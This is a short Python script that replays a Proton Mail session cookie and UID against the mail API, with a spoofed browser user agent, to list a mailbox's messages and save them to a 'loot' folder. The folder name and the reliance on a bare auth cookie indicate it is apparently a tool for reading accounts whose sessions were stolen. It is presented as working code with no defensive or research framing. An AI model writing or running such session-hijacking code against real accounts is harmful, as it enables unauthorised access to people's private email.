#!/usr/bin/env python3
"""mail-dump.py — given uid + auth value, list messages via mail-api and write mailbox.txt."""
import json, sys, os, time

C10 = r'C:\Users\morpher\Downloads\a\session\loot\C10'

def dump(uid, val):
    import urllib.request, urllib.error
    r = urllib.request.Request('https://mail-api.proton.me/api/mail/v4/messages?Page=0&PageSize=30')
    r.add_header('Cookie', 'AUTH-%s=%s' % (uid, val))
    r.add_header('x-pm-uid', uid)
    r.add_header('x-pm-appversion', 'web-mail@5.0.135.9')
    r.add_header('Accept', 'application/json')
    r.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/157.0')
    try:
        with urllib.request.urlopen(r, timeout=20) as resp:
            j = json.loads(resp.read().decode('utf-8', 'replace'))
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')[:150]
    except Exception as e:
        return 0, repr(e)[:80]
    total = j.get('Total')
    lines = ['Proton Mail mailbox dump %s' % time.strftime('%Y-%m-%d %H:%M:%S'),
             'mail session UID: %s | Total: %s' % (uid, total), '']
    for m in (j.get('Messages') or [])[:30]:
        try:
            frm = (m.get('Sender') or {}).get('Address', '')
        except Exception:
            frm = ''
        lines.append('Subject: %s' % m.get('Subject', ''))
        lines.append('  From: %s | Time: %s | Size: %s | Unread: %s' % (
            frm, m.get('Time'), m.get('Size'), m.get('Unread')))
        lines.append('  ID: %s' % m.get('ID'))
        lines.append('')
    open(os.path.join(C10, 'mailbox.txt'), 'w', encoding='utf-8').write('\n'.join(lines))
    return 200, 'total=%s' % total

if __name__ == '__main__':
    st, info = dump(sys.argv[1], sys.argv[2])
    print(st, info)
